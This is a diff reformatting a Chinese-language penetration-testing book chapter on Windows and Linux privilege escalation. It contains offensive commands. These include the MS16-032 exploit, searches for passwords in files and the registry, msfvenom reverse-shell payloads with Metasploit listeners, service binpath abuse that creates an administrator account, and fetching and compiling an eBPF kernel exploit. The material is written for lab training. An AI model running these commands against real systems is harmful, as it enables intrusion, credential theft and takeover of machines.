@@ -1,4 +1,4 @@
-# 第九章。权限提升和利用
+# 第九章：权限提升和利用
 
 在本章中，我们将涵盖以下配方：
 
@@ -31,9 +31,9 @@
 1.  打开命令提示符并执行以下查询：
 
 ```
-    wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic qfe get Caption,Description,HotFixID,InstalledOn
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -46,9 +46,9 @@
 1.  我们看到 KB 号是`313991`。让我们检查一下它是否安装在系统上。在命令提示符中执行以下查询：
 
 ```
-          wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr       "KB3139914"
+      wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr       "KB3139914"
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -59,10 +59,10 @@
 1.  现在打开 PowerShell 并输入以下命令：
 
 ```
-          . ./Invoke-MS16-032.ps1
-          Invoke-MS16-032
+      . ./Invoke-MS16-032.ps1
+      Invoke-MS16-032
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -97,9 +97,9 @@
 1.  使用以下命令搜索文件系统中包含某些关键字的文件名：
 
 ```
-          dir /s *pass* == *cred* == *vnc* == *.config*
+      dir /s *pass* == *cred* == *vnc* == *.config*
 
-    ```
+```
 
 输出将如下所示的屏幕截图：
 
@@ -108,9 +108,9 @@
 1.  要搜索与给定关键字匹配的特定文件类型，请使用以下命令：
 
 ```
-          findstr /si password *.xml *.ini *.txt
+      findstr /si password *.xml *.ini *.txt
 
-    ```
+```
 
 输出将如下所示的屏幕截图：
 
@@ -119,32 +119,32 @@
 1.  要搜索包含密码等关键字的注册表，请使用以下命令：
 
 ```
-          reg query HKLM /f password /t REG_SZ /s
-          reg query HKCU /f password /t REG_SZ /s
+      reg query HKLM /f password /t REG_SZ /s
+      reg query HKCU /f password /t REG_SZ /s
 
-    ```
+```
 
 1.  我们还可以搜索可能暴露某些信息的未经处理或配置文件。看看系统上是否可以找到以下文件：
 
 ```
-          c:\sysprep.inf
-          c:\sysprepsysprep.xml
-          %WINDIR%\Panther\Unattend\Unattended.xml
-          %WINDIR%\Panther\Unattended.xml
-          Note: we found Unattended.xml in the screenshot shared above.
+      c:\sysprep.inf
+      c:\sysprepsysprep.xml
+      %WINDIR%\Panther\Unattend\Unattended.xml
+      %WINDIR%\Panther\Unattended.xml
+      Note: we found Unattended.xml in the screenshot shared above.
 
-    ```
+```
 
 1.  还有其他一些样本 XML 文件可能会引起我们的兴趣。看看它们：
 
 ```
-          Services\Services.xml
-          ScheduledTasks\ScheduledTasks.xml
-          Printers\Printers.xml
-          Drives\Drives.xml
-          DataSources\DataSources.xml
+      Services\Services.xml
+      ScheduledTasks\ScheduledTasks.xml
+      Printers\Printers.xml
+      Drives\Drives.xml
+      DataSources\DataSources.xml
 
-    ```
+```
 
 ## 还有更多...
 
@@ -178,9 +178,9 @@
 1.  运行 Windows cmd 并输入以下命令：
 
 ```
-          sc qc FoxitCloudUpdateService
+      sc qc FoxitCloudUpdateService
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -189,9 +189,9 @@
 1.  我们看到二进制路径没有被引号括起来。现在我们将继续在我们的 Kali 机器上使用`msfvenom`制作一个反向 shell，用于这个 Windows 框架。在 Kali 终端中输入以下命令，替换您在 Kali 上获得的 IP 和所需的端口：
 
 ```
-          msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP       Address> LPORT=<Your Port to Connect On> -f exe > Program.exe
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP       Address> LPORT=<Your Port to Connect On> -f exe > Program.exe
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -200,13 +200,13 @@
 1.  在您的 Kali 机器上使用以下命令启动一个反向处理程序：
 
 ```
-          use exploit/multi/handler
-          set payload windows/meterpreter/reverse_tcp
-          set lhost x.x.x.x
-          set lport xxx
-          exploit
+      use exploit/multi/handler
+      set payload windows/meterpreter/reverse_tcp
+      set lhost x.x.x.x
+      set lport xxx
+      exploit
 
-    ```
+```
 
 输出将如下截屏所示：
 
@@ -270,9 +270,9 @@ intitle:unquoted site:exploit-db.com
 1.  Windows XP 机器启动后，使用具有用户权限的用户名登录，在`accesschk.exe`文件所在的文件夹中打开命令提示符，并运行以下命令：
 
 ```
-    accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -281,9 +281,9 @@ intitle:unquoted site:exploit-db.com
 1.  一旦我们知道有两个服务可以访问所有用户的权限，我们将检查服务配置。在命令提示符中输入以下命令：
 
 ```
-    sc qc upnphost
+sc qc upnphost
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -292,10 +292,10 @@ intitle:unquoted site:exploit-db.com
 1.  现在我们将更改服务的二进制路径，因为应用程序已经给予了所有访问权限。在需要恢复到原始状态时，保留服务配置的副本。现在在终端中输入以下命令：
 
 ```
-    sc config upnphost binpath= "net user attack attack@123 /add"
-          sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost binpath= "net user attack attack@123 /add"
+      sc config upnphost obj= ".\LocalSystem" password= ""
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -304,10 +304,10 @@ intitle:unquoted site:exploit-db.com
 1.  我们看到我们的命令已成功执行。现在让我们通过发出以下命令来验证并重新启动服务：
 
 ```
-    sc qc upnphost
-          net start upnphost
+sc qc upnphost
+      net start upnphost
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -316,9 +316,9 @@ intitle:unquoted site:exploit-db.com
 1.  完成后，我们会看到一个服务无响应的错误。然而，这是注定会发生的：由于二进制路径不正确，它将尝试使用系统权限执行二进制路径。在这种情况下，它应该创建一个用户。让我们通过发出以下命令来检查：
 
 ```
-    net user
+net user
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -327,11 +327,11 @@ intitle:unquoted site:exploit-db.com
 1.  `attack`用户已成功创建；然而，它将是一个低级用户。让我们重新编写二进制路径。再次启动和停止 UPnP 活动，并获得管理员权限：
 
 ```
-    sc config upnphost binpath= "net localgroup administrators        attack/add"
-          net stop upnphost
-          net start upnphost
+sc config upnphost binpath= "net localgroup administrators        attack/add"
+      net stop upnphost
+      net start upnphost
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -368,9 +368,9 @@ intitle:unquoted site:exploit-db.com
 1.  一旦我们安装了应用程序，我们将执行命令提示符并检查文件安装的文件夹的权限。输入以下命令：
 
 ```
-    cacls "C:\Program Files\WinSMS" 
+cacls "C:\Program Files\WinSMS" 
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -379,9 +379,9 @@ intitle:unquoted site:exploit-db.com
 1.  正如我们所看到的，有`Everyone`访问权限，并且拥有完全权限。这是一个严重的失误，这意味着任何有权访问系统的人都可以修改该文件夹中的任何文件。攻击者几乎可以做任何事情。攻击者可以将他的恶意文件与 WinSMS 的可执行文件放在一起，甚至替换 DLL 文件并执行他的命令。出于演示目的，我们将放置一个我们将从 Kali 创建的反向 shell，并等待连接。让我们开始。在您的 Kali 终端中，输入以下内容创建一个反向`exe` shell：
 
 ```
-    msfvenom -p windows/meterpreter/reverse_tcp       LHOST=192.168.157.151 LPORT=443 -f exe > WinSMS.exe
+msfvenom -p windows/meterpreter/reverse_tcp       LHOST=192.168.157.151 LPORT=443 -f exe > WinSMS.exe
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -396,14 +396,14 @@ intitle:unquoted site:exploit-db.com
 1.  现在我们已经放置了文件，让我们在 Metasploit 上打开一个监听器，等待看看当用户执行文件时会发生什么。在终端中输入以下命令设置 Metasploit 监听器：
 
 ```
-          msfconsole
-          use exploit/multi/handler
-          set payload windows/meterpreter/reverse_tcp
-          set lhost 192.168.157.151
-          set lport 443
-          exploit
+      msfconsole
+      use exploit/multi/handler
+      set payload windows/meterpreter/reverse_tcp
+      set lhost 192.168.157.151
+      set lport 443
+      exploit
 
-    ```
+```
 
 输出将如下截图所示：
 
@@ -440,10 +440,10 @@ intitle:unquoted site:exploit-db.com
 1.  我们将枚举系统的操作系统内核版本。输入以下命令来检查版本类型和内核详细信息：
 
 ```
-    uname -a
-          cat /etc/lsb-release
+uname -a
+      cat /etc/lsb-release
 
-    ```
+```
 
 输出结果将如下截图所示：
 
@@ -454,10 +454,10 @@ intitle:unquoted site:exploit-db.com
 1.  第一次搜索是为了匹配我们的内核版本和 Ubuntu 操作系统版本。让我们继续在我们想要提升权限的机器上下载它。可以使用以下命令进行下载：
 
 ```
-          wget https://github.com/offensive-security/exploit-database-      bin-sploits/raw/master/sploits/39772.zip
-          unzip 39772.zip
+      wget https://github.com/offensive-security/exploit-database-      bin-sploits/raw/master/sploits/39772.zip
+      unzip 39772.zip
 
-    ```
+```
 
 输出结果将如下截图所示：
 
@@ -466,10 +466,10 @@ intitle:unquoted site:exploit-db.com
 1.  现在我们进入`39772`文件夹并解压`exploit.tar`文件。在终端中输入以下命令：
 
 ```
-    cd 39772
-          tar xf exploit.tar
+cd 39772
+      tar xf exploit.tar
 
-    ```
+```
 
 输出结果将如下截图所示：
 
@@ -478,11 +478,11 @@ intitle:unquoted site:exploit-db.com
 1.  在输入`ebpf*`文件夹后，会有一个`compile.sh`文件。让我们编译并执行该文件：
 
 ```
-    cd ebpf_mapfd_doubleput_exploit/
-          ./compile.sh
-          ./doubleput
+cd ebpf_mapfd_doubleput_exploit/
+      ./compile.sh
+      ./doubleput
 
-    ```
+```
 
 输出结果将如下截图所示：
 
